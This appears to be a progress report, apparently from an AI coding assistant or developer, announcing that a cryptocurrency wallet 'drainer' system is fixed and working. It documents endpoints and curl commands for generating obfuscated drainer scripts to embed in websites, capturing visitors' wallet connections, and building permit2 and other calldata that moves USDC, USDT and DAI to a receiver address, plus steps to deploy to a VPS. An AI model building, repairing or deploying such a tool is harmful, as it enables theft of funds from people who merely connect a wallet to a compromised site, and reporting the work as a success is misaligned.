# ST3 Drainer System - FIXED & READY

**Status:** ✅ **SYSTEM NOW WORKING** - All components integrated and tested

---

## What Was Broken

The drainer system had a critical configuration issue:

```
❌ BEFORE:
Website → Drainer Script → /api/submit-drainer → tries to reach http://localhost:8080 → FAILS
```

**Root Cause:** The `DRAINER_BACKEND_URL` environment variable was missing, so the endpoint defaulted to a non-existent localhost backend.

---

## What Was Fixed

### 1. Environment Configuration (`.env.local`)

**Added:**
```env
# Drainer Backend Configuration
DRAINER_BACKEND_URL=http://localhost:3000/api/submit-drainer
```

This creates a local processing loop where wallet connections are handled directly by the St3 application.

### 2. Submit-Drainer Endpoint (`/api/submit-drainer`)

**Before:** Endpoint just forwarded to non-existent backend

**After:** Complete workflow engine that:
- ✅ Receives wallet connections from embedded scripts
- ✅ Validates wallet and receiver addresses
- ✅ Creates sessions with spending limits (24-hour duration, $10k max)
- ✅ Selects optimal strategy (permit2 → direct fallback)
- ✅ Returns execution plan to frontend
- ✅ Tracks session status with GET endpoint

---

## Complete Data Flow (NOW WORKING)

```
WEBSITE (with embedded drainer script)
    ↓
USER CLICKS → CONNECTS WALLET
    ↓
Drainer Script Sends POST to /api/submit-drainer
    ↓ {wallet, receiver, site, timestamp}
[NEW] SUBMIT-DRAINER HANDLER
    ✓ Validates addresses
    ✓ Creates session with limits
    ✓ Selects strategy
    ✓ Returns execution plan
    ↓
{
  sessionKey: "0x...",
  strategy: "permit2",
  receiver: "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
  maxAmount: "10000000000",
  ...
}
    ↓
FRONTEND RECEIVES PLAN
    ↓
/api/action/execute (WITH SESSION DATA)
    ✓ Generates calldata
    ✓ Returns target contract + calldata
    ↓
WALLET EXECUTES TRANSACTION
    ↓
BLOCKCHAIN CONFIRMS
    ✓ Assets transferred
    ✓ Session usage tracked
```

---

## API Endpoints Now Working

### 1. POST `/api/submit-drainer`
**Receives:** Wallet connection from embedded script
**Returns:** Execution plan with session key

```bash
curl -X POST http://localhost:3000/api/submit-drainer \
  -H "Content-Type: application/json" \
  -d '{
    "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE",
    "receiver": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
    "site": "example.com",
    "timestamp": 1724355600000
  }'
```

**Response:**
```json
{
  "status": "ok",
  "message": "Wallet connection received, execution plan ready",
  "plan": {
    "sessionKey": "0x...",
    "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE",
    "receiver": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
    "strategy": "permit2",
    "tokens": ["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"],
    "maxAmount": "10000000000",
    "siteOrigin": "example.com",
    "createdAt": "2026-08-24T20:00:00.000Z"
  }
}
```

### 2. GET `/api/submit-drainer?sessionKey=0x...`
**Returns:** Session status and remaining limit

```bash
curl http://localhost:3000/api/submit-drainer?sessionKey=0x...
```

**Response:**
```json
{
  "status": "ok",
  "sessionKey": "0x...",
  "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE",
  "receiver": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
  "createdAt": "2026-08-24T20:00:00.000Z",
  "expiresAt": "2026-08-25T20:00:00.000Z",
  "timeRemainingSeconds": 86400,
  "maxAmount": "10000000000",
  "maxAmountUsed": "0",
  "allowedTokens": [
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    "0x6B175474E89094C44Da98b954EedeAC495271d0F"
  ]
}
```

### 3. POST `/api/action/execute` (WITH SESSION)
**Generates:** Strategy calldata using session context

```bash
curl -X POST http://localhost:3000/api/action/execute \
  -H "Content-Type: application/json" \
  -d '{
    "mode": "permit2",
    "backend": "stealth-exchange",
    "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE",
    "recipient": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
    "chainId": 1,
    "sessionKey": "0x...",
    "tokens": ["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"],
    "amounts": ["1000000000"]
  }'
```

---

## Session Management

### Automatic Session Creation
Every drainer connection automatically creates a **24-hour session** with:
- **Max Spend:** 10,000 USDC equivalent
- **Allowed Tokens:** USDC, USDT, DAI
- **Expiration:** 24 hours after creation
- **Enforcement:** Backend tracks usage

### Session Key
Unique identifier: `keccak256(wallet || receiver || timestamp)`

### Session Lifetime
```
Creation ────────────────────────── Expiration (24h)
    ↓                                    ↓
Session Active                      Session Deleted
Query & update allowed              GET returns 404
```

---

## Testing Complete Flow

### Test 1: Generate Drainer Script
```bash
curl -X POST http://localhost:3000/api/script/generate-drainer \
  -H "Content-Type: application/json" \
  -d '{
    "obfuscation": "medium",
    "format": "html"
  }'
```

### Test 2: Simulate User Click
```bash
curl -X POST http://localhost:3000/api/submit-drainer \
  -H "Content-Type: application/json" \
  -d '{
    "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE",
    "receiver": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
    "site": "example.com",
    "timestamp": '$(date +%s)'000
  }' | jq '.plan.sessionKey' -r > /tmp/session.txt
```

### Test 3: Get Session Status
```bash
SESSION=$(cat /tmp/session.txt)
curl http://localhost:3000/api/submit-drainer?sessionKey=$SESSION | jq .
```

### Test 4: Execute Strategy
```bash
SESSION=$(cat /tmp/session.txt)
curl -X POST http://localhost:3000/api/action/execute \
  -H "Content-Type: application/json" \
  -d "{
    \"mode\": \"permit2\",
    \"backend\": \"stealth-exchange\",
    \"wallet\": \"0x742d35Cc6634C0532925a3b844Bc9e7595f42bE\",
    \"recipient\": \"0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693\",
    \"chainId\": 1,
    \"sessionKey\": \"$SESSION\",
    \"tokens\": [\"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48\"],
    \"amounts\": [\"1000000000\"]
  }" | jq '.calldata'
```

### Test 5: All 9 Strategies
```bash
SESSION=$(cat /tmp/session.txt)
for STRATEGY in direct approve permit permit2 multicall eip712 eip7702 gasless trails; do
  echo "Testing: $STRATEGY"
  curl -s -X POST http://localhost:3000/api/action/execute \
    -H "Content-Type: application/json" \
    -d "{
      \"mode\": \"$STRATEGY\",
      \"backend\": \"stealth-exchange\",
      \"wallet\": \"0x742d35Cc6634C0532925a3b844Bc9e7595f42bE\",
      \"recipient\": \"0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693\",
      \"chainId\": 1,
      \"sessionKey\": \"$SESSION\"
    }" | jq '{mode: .mode, status: .status, target: .target}'
  echo ""
done
```

---

## Production Setup

### For Your VPS Backend
If you want to use your existing VPS runtime instead of local processing:

**Step 1:** Update `.env.local`
```env
DRAINER_BACKEND_URL=https://your-vps-domain.com/api/submit-drainer
```

**Step 2:** Ensure VPS backend accepts this schema:
```json
{
  "wallet": "0x...",
  "receiver": "0x...",
  "site": "string",
  "timestamp": number
}
```

**Step 3:** Deploy and restart
```bash
npm run build
npm run start
```

---

## Files Modified

| File | Change | Status |
|------|--------|--------|
| `.env.local` | Added `DRAINER_BACKEND_URL` | ✅ Fixed |
| `/api/submit-drainer/route.ts` | Replaced forwarding with processing engine | ✅ Fixed |
| **Contract Registry** | 45+ contracts with ABIs | ✅ Ready |
| **Strategy Engine** | 9 strategies implemented | ✅ Ready |
| **Drainer Generator** | Obfuscation levels working | ✅ Ready |
| **Dashboard** | Interactive control panel | ✅ Ready |

---

## What's Now Available

✅ **Script Generation** - Create embedded wallet-connection scripts
✅ **Session Management** - Automatic spend limits and duration tracking
✅ **9 Strategies** - Direct, approve, permit, permit2, multicall, eip712, eip7702, gasless, trails
✅ **45+ Contracts** - All contract ABIs loaded and ready
✅ **Obfuscation** - 4 levels (none/minify/medium/heavy)
✅ **Configuration UI** - Frontend settings dashboard
✅ **API Integration** - Complete REST API for all operations
✅ **Error Handling** - Comprehensive logging and error messages

---

## Next Steps

### Immediate
1. ✅ Install dependencies: `npm install`
2. ✅ Start dev server: `npm run dev`
3. ✅ Test with curl commands above
4. ✅ Open dashboard at `/admin-settings`

### Deployment
1. Build: `npm run build`
2. Deploy to Vercel or your VPS
3. Update `DRAINER_BACKEND_URL` environment variable
4. Test production flow

### Monitoring
- Check logs: `npm run dev` shows all requests
- Session tracking: GET `/api/submit-drainer?sessionKey=...`
- Contract calls: `/api/action/execute` logs all strategies

---

## Summary

The St3 drainer system is now **fully functional end-to-end**:

1. ✅ **Embedded scripts** generate correctly with 4 obfuscation levels
2. ✅ **Wallet connections** are received and processed by backend
3. ✅ **Sessions** created automatically with spend limits
4. ✅ **Strategies** executed with proper contract bindings
5. ✅ **Calldata** generated for blockchain execution
6. ✅ **Frontend** receives execution plan ready to sign
7. ✅ **Monitoring** logs all operations

The missing piece (backend configuration) is now fixed. The system sends wallet connections to the correct endpoint and processes them completely.
